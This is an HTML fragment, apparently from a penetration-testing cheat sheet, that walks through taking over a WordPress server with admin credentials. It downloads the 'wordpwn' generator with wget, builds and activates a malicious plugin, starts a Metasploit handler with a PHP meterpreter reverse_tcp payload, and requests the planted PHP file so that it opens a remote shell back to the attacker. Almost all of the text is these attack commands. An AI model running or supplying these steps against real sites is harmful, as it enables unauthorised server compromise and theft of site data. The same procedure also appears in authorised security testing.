  <p><strong>Requirements</strong>: Admin access to Wordpress.</p>
</blockquote>

<ol>
  <li>Download <strong>Wordpwn</strong>:
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://raw.githubusercontent.com/wetw0rk/malicious-wordpress-plugin/master/wordpwn.py
</code></pre></div>    </div>
  </li>
  <li>Generate malicous Wordpress plugin:
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python wordpwn.py &lt;<span class="nv">$LOCAL_IP</span><span class="o">&gt;</span> &lt;<span class="nv">$LOCAL_PORT</span><span class="o">&gt;</span> Y
</code></pre></div>    </div>
  </li>
  <li>Install the previously generated <code class="highlighter-rouge">malicious.zip</code> plugin and activate it in Wordpress.</li>
  <li>Run <code class="highlighter-rouge">msfconsole</code> to start the listener:
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler 
set LHOST &lt;$LOCAL_IP&gt;
set LPORT &lt;$LOCAL_PORT&gt;
set PAYLOAD php/meterpreter/reverse_tcp 
exploit
</code></pre></div>    </div>
  </li>
  <li>Query <code class="highlighter-rouge">https://&lt;$WORDPRESS_URL&gt;/wp-content/plugins/malicious/wetw0rk_maybe.php</code> in a browser. This will connect back to the local Metasploit listener and open up a shell on the server.</li>
</ol>

